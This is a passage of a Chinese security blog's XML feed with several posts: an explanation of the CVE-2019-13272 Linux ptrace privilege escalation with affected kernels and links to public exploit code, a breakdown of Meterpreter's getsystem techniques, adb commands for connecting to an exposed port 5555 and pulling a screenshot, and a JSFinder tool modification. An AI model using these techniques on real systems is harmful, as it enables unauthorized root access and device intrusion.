            <tag> 工具推送 </tag>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-3156 sudo堆栈溢出漏洞预警</title>
      <link href="2021/01/27/CVE-2021-3156%20sudo%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6/"/>
      <url>2021/01/27/CVE-2021-3156%20sudo%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>近期CVE-2021-3156（sudo堆栈溢出漏洞）</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4242378657.png"></p><p>国外的Qualys 研究团队在 sudo 发现了堆溢出漏洞，sudo是一种几乎无处不在的非常实用程序，可用于大型 Unix 类操作系统（类似与windows的UAC功能，但是功能更加强大，它还允许用户使用其他用户的安全权限运行程序，不仅限于管理员哟）。<br>笔者立马去找了相关的信息，企图找到漏洞利用exp。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.qualys.com&#x2F;vulnerabilities-research&#x2F;2021&#x2F;01&#x2F;26&#x2F;cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit</span><br></pre></td></tr></table></figure><p>然后找到这篇文章，分析挺详细的，但是当我看到最后</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/481441035.png"></p><p>我瞬间泪崩，我kuzi都脱了，你给我说不行？说好的分享精神嘞?<br>但是人家卖产品，也情有可原嗷。<br>自己去分析内核代码写exp，那肯定不可能的，没到达那个水准，又不是专业的，算了算了，专业的事就该专业的人去弄，国内的大佬们应该很快就能写出exp了<br>不过我有点气，朋友又给我发了一个CVE-2019-13272 内核提权的漏洞，顺利找到了exp。</p><h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><p>kernel 5.1.17之前版本中存在安全漏洞，该漏洞源于kernel/ptrace.c文件的ptrace_link没有正确处理对凭证的记录，攻击者可利用该漏洞获取root访问权限。</p><p>漏洞测试成功的版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu 16.04.5 kernel 4.15.0-29-generic</span><br><span class="line"></span><br><span class="line">Ubuntu 18.04.1 kernel 4.15.0-20-generic</span><br><span class="line"></span><br><span class="line">Ubuntu 19.04 kernel 5.0.0-15-generic</span><br><span class="line"></span><br><span class="line">Ubuntu Mate 18.04.2 kernel 4.18.0-15-generic</span><br><span class="line"></span><br><span class="line">Linux Mint 19 kernel 4.15.0-20-generic</span><br><span class="line"></span><br><span class="line">Xubuntu 16.04.4 kernel 4.13.0-36-generic</span><br><span class="line"></span><br><span class="line">ElementaryOS 0.4.1 4.8.0-52-generic</span><br><span class="line"></span><br><span class="line">Backbox 6 kernel 4.18.0-21-generic</span><br><span class="line"></span><br><span class="line">Parrot OS 4.5.1 kernel 4.19.0-parrot1-13t-amd64</span><br><span class="line"></span><br><span class="line">Kali kernel 4.19.0-kali5-amd64</span><br><span class="line"></span><br><span class="line">Redcore 1806 (LXQT) kernel 4.16.16-redcore</span><br><span class="line"></span><br><span class="line">MX 18.3 kernel 4.19.37-2~mx17+1</span><br><span class="line"></span><br><span class="line">RHEL 8.0 kernel 4.18.0-80.el8.x86_64</span><br><span class="line"></span><br><span class="line">Debian 9.4.0 kernel 4.9.0-6-amd64</span><br><span class="line"></span><br><span class="line">Debian 10.0.0 kernel 4.19.0-5-amd64</span><br><span class="line"></span><br><span class="line">Devuan 2.0.0 kernel 4.9.0-6-amd64</span><br><span class="line"></span><br><span class="line">SparkyLinux 5.8 kernel 4.19.0-5-amd64</span><br><span class="line"></span><br><span class="line">Fedora Workstation 30 kernel 5.0.9-301.fc30.x86_64</span><br><span class="line"></span><br><span class="line">Manjaro 18.0.3 kernel 4.19.23-1-MANJARO</span><br><span class="line"></span><br><span class="line">Mageia 6 kernel 4.9.35-desktop-1.mga6</span><br><span class="line"></span><br><span class="line">Antergos 18.7 kernel 4.17.6-1-ARCH</span><br></pre></td></tr></table></figure><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>当调用PTRACE_TRACEME时，ptrace_link函数将获得对父进程凭据的RCU引用，然后将该指针指向get_cred函数，问题就出在这，PTRACE_TRACEME获取父进程的凭证（内核还记录了跟踪器的凭据），那么就能以父进程的权限执行各种操作，如果一个低权限的用户获取了高权限的父进程，但是在linux中，ptrace是一种系统调用，也就是说你得先拥有root权限，才能用ptrace到其他进程，如果只是普通权限，只能ptarce到子进程（下面会在利用条件中说）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">static void ptrace_link(struct task_struct *child, struct task_struct *new_parent)</span><br><span class="line">&#123;</span><br><span class="line">  rcu_read_lock();</span><br><span class="line">  __ptrace_link(child, new_parent, __task_cred(new_parent));</span><br><span class="line">  rcu_read_unlock();</span><br><span class="line">  __ptrace_link(child, new_parent, current_cred());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>研究人员概述的这样一个攻击场景：</p><blockquote><p>涉及一个父进程，父进程创建一个子进程，这个子进程会再创建一个子进程。第一个子进程使用命令pkexec（用于以root身份运行程序），第二个子进程运行PTRACE_TRACEME，然后第一个子进程丢弃其权限（理解为降权，以前权限很高，然后被降了）。最终结果是父进程可以使用ptrace来控制第一个子进程，后者可以使用ptrace来控制第二个子进程 - 从而让攻击者获得对两个进程的控制权。</p></blockquote><p>我们不妨来分析一下这个场景：（利用思路就是利用父子进程来获得root用户访问权限（凭据））</p><blockquote><p>首先父进程fork出一个子进程，子进程1又fork出相对于它的子进程2，子进程1有着高权限（很牛逼，无所不能，我就是root），子进程二运行着PTRACE_TRACEME，后面真正的root看着子进程1不爽（你凭什么拥有和我一样的权限啊，你也不看看你什么身份），然后就把子进程1降权了，但是运行着PTRACE_TRACEME的子进程2悄悄的把子进程1高权限的凭证给记录下来了，然后我们通过父进程去ptrace子进程1，再去ptrace子进程2，因为子进程二记录着root的凭据，然后我们以此来执行root权限的任意代码。</p></blockquote><p>exp中利用思路就是是直接让子进程1去执行带有PTRACE_TRACEME的Polkit的pkexec（很难理解，但是后面看了Polkit以及exp，好像又理解了）</p><p>我分析起来都感到很鸡肋，实际利用也是这样的，假定如果我们能控制父进程（父进程最先开始高权限，运行ptrace到子进程，然后被其子进程运行的PTRACE_TRACEME记录下来了父进程高权限的凭据，后面父进程被降权了），然后通过ptrace到子进程获得高权限凭据，然后执行代码。</p><h2 id="1-ptrace是什么？"><a href="#1-ptrace是什么？" class="headerlink" title="1.ptrace是什么？"></a>1.ptrace是什么？</h2><p>如果了解过逆向工程的小伙伴，肯定对这个ptrace不陌生，因为这是反调试技术中的基础入门手段，虽然现在诸如代码虚拟化之类的其他防逆向技术已经很成熟了，但是ptrace仍然是一些商业软件产品中使用，也是我们入门反调试所必须的基础技术！</p><p>Ptrace 可以让父进程控制子进程运行，并可以检查和改变子进程的核心image的功能（Peek and poke 在系统编程中是很知名的叫法，指的是直接读写内存内容）。ptrace主要跟踪的是进程运行时的状态，直到收到一个终止信号结束进程，这里的信号如果是我们给程序设置的断点，则进程被中止，并且通知其父进程，在进程中止的状态下，进程的内存空间可以被读写。当然父进程还可以使子进程继续执行，并选择是否忽略引起中止的信号，ptrace可以让一个进程监视和控制另一个进程的执行,并且修改被监视进程的内存、寄存器等,主要应用于断点调试和系统调用跟踪，strace和gdb工具就是基于ptrace编写的！</p><p>ptrace在linux 反调试技术中的地位就如同nc在安全界的地位，瑞士军刀啊!</p><p>ptrace使用场景：<br>1.编写动态分析工具，如gdb,strace<br>2.反追踪，一个进程只能被一个进程追踪(注：一个进程能同时追踪多个进程)，若此进程已被追踪，其他基于ptrace的追踪器将无法再追踪此进程，更进一步可以实现子母进程双线执行动态解密代码等更高级的反分析技术<br>3.代码注入，往其他进程里注入代码。<br>4.不退出进程，进行在线升级。</p><p>而ptrace_traceme就是告诉父进程就字面意思跟踪我吧。</p><h2 id="2-什么是pakexec？"><a href="#2-什么是pakexec？" class="headerlink" title="2.什么是pakexec？"></a>2.什么是pakexec？</h2><p>描述：pkexec是linux左面freedestop上的验证程序，pkexec允许授权用户以PROGRAM其他用户身份执行。如果username未指定，则该程序将以管理超级用户root的身份执行，在默认情况下需要管理员授权。</p><p>值得注意的是：pkexec是直接带有PTRACE_TRACEME的Polkit</p><p>Polkit是什么？</p><blockquote><p>是用于在类似Unix的操作系统中控制系统范围特权的组件，它为非特权进程提供了一种与特权进程进行通信的有组织方式。</p></blockquote><p>漏洞利用代码中也是用的pkexec</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/2834510010.png"></p><h2 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h2><p>所以说这个漏洞利用条件有两点：<br>1.找suid降权的程序（我们能控制的，如pkexec）<br>2.如果利用pkexec（利用条件为桌面的终端linux，通过SSH会话利用此漏洞不成功）</p><p>exp用的就是pkexec，为什么用pkexec，因为在pkexec涉及到降权的行为，感兴趣的可以自己查资料结合exp看看</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>exp整体利用逻辑<br>1.父进程生成子进程1<br>2.子进程1生成父进程2<br>3.子进程1执行suid程序pkexec<br>4.子进程2运行ptrace_traceme<br>5.父进程修改子进程1内存，ptrace到子进程2然后再修改子进程2执行任意代码（子进程二为root权限）</p><p>exp地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;47163</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;k8gege&#x2F;K8tools&#x2F;blob&#x2F;master&#x2F;CVE-2019-13272.c</span><br></pre></td></tr></table></figure><p>gcc正常编译就行了</p>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>当输入getsystem会发生什么？</title>
      <link href="2021/01/27/%E5%BD%93%E8%BE%93%E5%85%A5getsystem%E4%BC%9A%E5%8F%91%E7%94%9F%E4%BB%80%E4%B9%88/"/>
      <url>2021/01/27/%E5%BD%93%E8%BE%93%E5%85%A5getsystem%E4%BC%9A%E5%8F%91%E7%94%9F%E4%BB%80%E4%B9%88/</url>
      
        <content type="html"><![CDATA[<blockquote><p>“Meterpreter的getsystem命令是非常nice的！在输入getsystem的命令之后，Meterpreter就会神奇的将权限从本地管理员提升为SYSTEM用户。”</p></blockquote><h3 id="到底发生了什么事？"><a href="#到底发生了什么事？" class="headerlink" title="到底发生了什么事？"></a><strong>到底发生了什么事？</strong></h3><p>getsystem命令包含有三种技术，前两个基于命名管道模拟，最后一个依靠令牌复制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getsystem -h</span><br><span class="line">Usage: getsystem [options]</span><br><span class="line"> </span><br><span class="line">Attempt to elevate your privilege to that of local system.</span><br><span class="line"> </span><br><span class="line">OPTIONS:</span><br><span class="line"> </span><br><span class="line">    -h        Help Banner.</span><br><span class="line">    -t   The technique to use. (Default to &#39;0&#39;).</span><br><span class="line">        0 : All techniques available</span><br><span class="line">        1 : Service - Named Pipe Impersonation (In Memory&#x2F;Admin)</span><br><span class="line">        2 : Service - Named Pipe Impersonation (Dropper&#x2F;Admin)</span><br><span class="line">        3 : Service - Token Duplication (In Memory&#x2F;Admin)</span><br></pre></td></tr></table></figure><hr><h3 id="让我们来了解一下原理："><a href="#让我们来了解一下原理：" class="headerlink" title="让我们来了解一下原理："></a><strong>让我们来了解一下原理：</strong></h3><h5 id="技术-1"><a href="#技术-1" class="headerlink" title="技术 1"></a><strong>技术 1</strong></h5><p>Meterpreter将创建一个命名管道，并且还创建并运行一个服务，该服务运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe &#x2F;c echo “some data” &gt; \\.\pipe\[random pipe here]</span><br></pre></td></tr></table></figure><p>生成的cmd.exe连接到Meterpreter的命名管道时，Meterpreter将有机会模拟该服务安全上下文（模仿客户端是一个命名管道功能)，服务的上下文是SYSTEM权限，所以将获得SYSTEM权限。</p><h5 id="技术-2"><a href="#技术-2" class="headerlink" title="技术 2"></a><strong>技术 2</strong></h5><p>类似于技术1，它创建一个命名管道并模拟第一个客户端的服务安全上下文并与其连接。若要使用SYSTEM用户上下文创建客户端，此技术将DLL拖放到磁盘上，并将rundll32.exe安排为服务，以将DLL作为SYSTEM运行，然后将DLL连接到命名管道，获得SYSTEM权限。</p><p>感兴趣得可以看看elevate_via_service_namedpipe2在Meterpreter的源代码，研究一下这种技术。<strong>注意：</strong>该技术将文件拖放到磁盘上。这也是反病毒木马软件查杀的依据。</p><h5 id="技术-3"><a href="#技术-3" class="headerlink" title="技术 3"></a><strong>技术 3</strong></h5><p>该技术将假定当前能使用SeDebugPrivileges-getprivs，它将遍历所有打开的服务，以找到以SYSTEM身份运行且有权注入的服务。如果找到了，它将使用反射性DLL注入技术在找到的服务的内存空间中运行lifter.dll，这时候会将当前线程ID（来自Meterpreter）传递给lift.dll，lift.dll运行时，lifter.dll会获取SYSTEM令牌，在Meterpreter中打开主线程，然后尝试将SYSTEM令牌应用于该线程。该技术的实现仅限于x86环境，从隐藏的方面来讲，它不需要产生新的过程，它完全在内存中进行，动静很小。</p><h3 id="专业名词参考链接"><a href="#专业名词参考链接" class="headerlink" title="专业名词参考链接"></a><strong>专业名词参考链接</strong></h3><blockquote><p>安全上下文：<a href="https://blog.csdn.net/lixinms/article/details/5148622">https://blog.csdn.net/lixinms/article/details/5148622</a><br>命名管道：<a href="https://www.anquanke.com/post/id/190207#h3-7">https://www.anquanke.com/post/id/190207#h3-7</a><br>反射DLL注入：<a href="https://www.cnblogs.com/h2zZhou/p/7721797.html">https://www.cnblogs.com/h2zZhou/p/7721797.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次adb使用</title>
      <link href="2021/01/25/%E8%AE%B0%E4%B8%80%E6%AC%A1adb%E4%BD%BF%E7%94%A8/"/>
      <url>2021/01/25/%E8%AE%B0%E4%B8%80%E6%AC%A1adb%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>adb对5555端口的利用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.\adb.exe connect IP    连接</span><br><span class="line">.\adb devices    查看</span><br><span class="line">.\adb shell screencap -p &#x2F;sdcard&#x2F;screen.png        截图</span><br><span class="line">.\adb pull &#x2F;sdcard&#x2F;screen.png    传回</span><br><span class="line">.\adb.exe disconnect IP        断开</span><br><span class="line">......</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> adb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>真香系列-JSFinder实用改造</title>
      <link href="2021/01/21/%E7%9C%9F%E9%A6%99%E7%B3%BB%E5%88%97-JSFinder%E5%AE%9E%E7%94%A8%E6%94%B9%E9%80%A0/"/>
      <url>2021/01/21/%E7%9C%9F%E9%A6%99%E7%B3%BB%E5%88%97-JSFinder%E5%AE%9E%E7%94%A8%E6%94%B9%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>JSFinder是一款优秀的github开源工具，这款工具功能就是查找隐藏在js文件中的api接口和敏感目录，以及一些子域名。</p><p>github链接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Threezh1&#x2F;JSFinder</span><br></pre></td></tr></table></figure><p>用于提取的正则表达式参考了LinkFinder<br>SFinder获取URL和子域名的方式：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/663556067.png"></p><h1 id="一些简单的使用方式："><a href="#一些简单的使用方式：" class="headerlink" title="一些简单的使用方式："></a>一些简单的使用方式：</h1><h4 id="简单爬取"><a href="#简单爬取" class="headerlink" title="简单爬取"></a>简单爬取</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python JSFinder.py -u http:&#x2F;&#x2F;www.mi.com</span><br><span class="line"></span><br><span class="line">#这个命令会爬取 http:&#x2F;&#x2F;www.mi.com 这单个页面的所有的js链接，并在其中发现url和子域名</span><br></pre></td></tr></table></figure><h4 id="深度爬取"><a href="#深度爬取" class="headerlink" title="深度爬取"></a>深度爬取</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python JSFinder.py -u http:&#x2F;&#x2F;www.mi.com -d</span><br><span class="line"></span><br><span class="line">#深入一层页面爬取JS，时间会消耗的更长,建议使用-ou 和 -os来指定保存URL和子域名的文件名</span><br><span class="line">python JSFinder.py -u http:&#x2F;&#x2F;www.mi.com -d -ou mi_url.txt -os mi_subdomain.txt</span><br></pre></td></tr></table></figure><h4 id="批量指定URL-指定JS"><a href="#批量指定URL-指定JS" class="headerlink" title="批量指定URL/指定JS"></a>批量指定URL/指定JS</h4><p>指定URL：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python JSFinder.py -f text.txt</span><br></pre></td></tr></table></figure><p>指定JS：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python JSFinder.py -f text.txt -j</span><br></pre></td></tr></table></figure><p>可以用brupsuite爬取网站后提取出URL或者JS链接，保存到txt文件中，一行一个。<br>指定URL或JS就不需要加深度爬取，单个页面即可,等等，这可以去github上面看使用说明。</p><h1 id="改造"><a href="#改造" class="headerlink" title="改造"></a>改造</h1><h2 id="1-为什么要改造这个东西？"><a href="#1-为什么要改造这个东西？" class="headerlink" title="1.为什么要改造这个东西？"></a>1.为什么要改造这个东西？</h2><p>因为我经常使用这款工具，我发现了很多不足之处，比如说，如果爬取一个大型一点的，会发现很多url，接口，但是大多数都是404，没有用处的，就是通过人工去筛选就得费好长一段时间，我有一次爬下来了1200多条，密密麻麻……………………….</p><p>所有我的设想是可以增加一个验证模块，进行简单的验证，扔掉那些不存在的url链接，减少人工的筛选。</p><h2 id="2-找到源码一顿改（验证模块）"><a href="#2-找到源码一顿改（验证模块）" class="headerlink" title="2.找到源码一顿改（验证模块）"></a>2.找到源码一顿改（验证模块）</h2><p>改源码一定要找到关键点改，我这里直接在它进行数据处理的时候加入我想要的东西：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">thread_num &#x3D; 0</span><br><span class="line">info &#x3D; &#39;访问成功&#39;</span><br><span class="line">lock &#x3D; threading.Lock()</span><br><span class="line">if urls &#x3D;&#x3D; None:</span><br><span class="line">  return None</span><br><span class="line">find_url_all_num &#x3D; len(urls)</span><br><span class="line">content_url &#x3D; &quot;&quot;</span><br><span class="line">content_subdomain &#x3D; &quot;&quot;</span><br><span class="line">if self.args.verify !&#x3D;0:</span><br><span class="line">  print(&quot;A total of Find &quot; + str(len(urls)) + &quot; URL:\n&quot;)</span><br><span class="line">  print(&quot;-----------------------But further validation is needed-----------------!\n\n\n&quot;)</span><br><span class="line">  domian_text &#x3D; requests.get(domian,verify &#x3D;False).text</span><br><span class="line">  print(&quot;The length of the page currently visited &#x3D;&gt;&quot;+str(len(domian_text)))</span><br><span class="line">  result &#x3D;&#123;&#125;</span><br><span class="line">  for url in urls:</span><br><span class="line">    thread_num +&#x3D; 1</span><br><span class="line">    self.therads_op(url, content_url, lock,thread_num,result)</span><br><span class="line">    if thread_num &#x3D;&#x3D; 100:</span><br><span class="line">      time.sleep(1)</span><br><span class="line">  find_url_success_num &#x3D; 0</span><br><span class="line">  for length,url_list in result.items():</span><br><span class="line">    print(&quot;-----------------------The return packet length is :&#123;len&#125;------------------------&quot;.format(len &#x3D;length))</span><br><span class="line">    for url in url_list:</span><br><span class="line">      print(url+&quot;\n&quot;)</span><br><span class="line">      find_url_success_num +&#x3D; 1</span><br><span class="line">      content_url+&#x3D;url+&quot;\n&quot;</span><br></pre></td></tr></table></figure><p>关键的一些代码，这里因为使用了网络验证，所以写了个多线程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def therads_op(self,url,content_url,lock,thread_num,result):</span><br><span class="line">    threading.Thread(target&#x3D;self.request(url,content_url,lock,result),args&#x3D;(url,content_url,lock,result,))</span><br><span class="line">    if lock.acquire():</span><br><span class="line">      thread_num -&#x3D; 1</span><br><span class="line">    lock.release()</span><br></pre></td></tr></table></figure><p>验证模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">def request(self,url,content_url,lock,result):</span><br><span class="line">   headers &#x3D; &#123;</span><br><span class="line">      &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit&#x2F;534.50 (KHTML, like Gecko) Version&#x2F;5.1 Safari&#x2F;534.50&quot;,</span><br><span class="line">   &#125;</span><br><span class="line">   try:</span><br><span class="line">      resp &#x3D; requests.get(url,verify &#x3D; False,timeout &#x3D; 10,headers&#x3D;headers)</span><br><span class="line">      if resp.status_code !&#x3D; 404 and lock.acquire():</span><br><span class="line">         content_url +&#x3D; url + &quot;\n&quot;</span><br><span class="line">         if result.get(str(len(resp.text)), 0) &#x3D;&#x3D; 0:</span><br><span class="line">            result[str(len(resp.text))] &#x3D; []</span><br><span class="line">            result[str(len(resp.text))].append(url)</span><br><span class="line">         else:</span><br><span class="line">            result[str(len(resp.text))].append(url)</span><br><span class="line">         lock.release()</span><br><span class="line"></span><br><span class="line">   except Exception as e:</span><br><span class="line">      pass</span><br><span class="line">   finally:</span><br><span class="line">      try:</span><br><span class="line">         lock.release()</span><br><span class="line">      except RuntimeError as e:</span><br><span class="line">         pass</span><br></pre></td></tr></table></figure><p>这里我是直接判断它返回值是不是404，当然你也可以加入你自己的判断条件，可以看到我的源码里，有计数返回包的长度，因为我发现很多包的返回包都是一样的，所以我这里判断长度，进行归类，有利于我们自己人工筛选，我们只需要得到任意长度的一个url返回包，就可以知道其他有着相同长度的url返回的内容（这就是我当时的想法吧）</p><h2 id="3-找到源码一阵改（输出数据格式）"><a href="#3-找到源码一阵改（输出数据格式）" class="headerlink" title="3.找到源码一阵改（输出数据格式）"></a>3.找到源码一阵改（输出数据格式）</h2><p>因为原工具是有把输出结果输出到一个文件的功能，但是我感觉不够直观，所以我把输出结果转换成了html文件，可以直接点击url，进行访问，方便了很多。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">if self.args.output_html !&#x3D;None:</span><br><span class="line">   table_tr0 &#x3D; &#39;&#39;</span><br><span class="line">   html &#x3D; html_Template()</span><br><span class="line">   total_str &#x3D; &#39;共url: %s，访问成功：%s，失败 %s&#39; % (find_url_all_num, find_url_success_num, find_url_all_num-find_url_success_num)</span><br><span class="line">   if self.args.verify !&#x3D;0:</span><br><span class="line">      for length,url_list in result.items():</span><br><span class="line">         for url in url_list:</span><br><span class="line">            url_a &#x3D; &quot;&lt;a href&#x3D;&#123;url&#125;&gt;点击&lt;&#x2F;a&gt;&quot;.format(url&#x3D;url)</span><br><span class="line">            table_td &#x3D; html.TABLE_TMPL % dict(length&#x3D;length, url&#x3D;url, result&#x3D;info,</span><br><span class="line">                                      ask_url&#x3D;url_a, )</span><br><span class="line">            table_tr0 +&#x3D; table_td</span><br><span class="line">   else:</span><br><span class="line">      for url in urls:</span><br><span class="line">         url_a &#x3D; &quot;&lt;a href&#x3D;&#123;url&#125;&gt;点击&lt;&#x2F;a&gt;&quot;.format(url&#x3D;url)</span><br><span class="line">         table_td &#x3D; html.TABLE_TMPL % dict(length&#x3D;&quot;无法获取&quot;, url&#x3D;url, result&#x3D;info,</span><br><span class="line">                                   ask_url&#x3D;url_a, )</span><br><span class="line">         table_tr0 +&#x3D; table_td</span><br><span class="line">   output &#x3D; html.HTML_TMPL % dict(domain&#x3D;self.args.url,value&#x3D;total_str, table_tr&#x3D;table_tr0, )</span><br><span class="line">   # 生成html报告</span><br><span class="line">   filename &#x3D; &#39;&#123;date&#125;_&#123;url&#125;.html&#39;.format(date&#x3D;time.strftime(&#39;%Y%m%d%H%M%S&#39;),url &#x3D; self.args.output_html)</span><br><span class="line">   dir &#x3D; str(os.getcwd())</span><br><span class="line">   filename &#x3D; os.path.join(dir, filename)</span><br><span class="line">   with open(filename, &#39;wb&#39;) as f:</span><br><span class="line">      f.write(bytes(output, &quot;utf-8&quot;))</span><br></pre></td></tr></table></figure><p>我把源码改成了一个类的形式，有利于以后的加入到大项目中，积小成多！</p><h2 id="4-效果预览"><a href="#4-效果预览" class="headerlink" title="4.效果预览"></a>4.效果预览</h2><p>在没有加验证参数的情况下:</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2054569634.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/364494591.png"></p><p>开启验证的情况下：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2205501301.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1106342449.png"></p><h1 id="总结"><a href="#总结" class="headerlink" 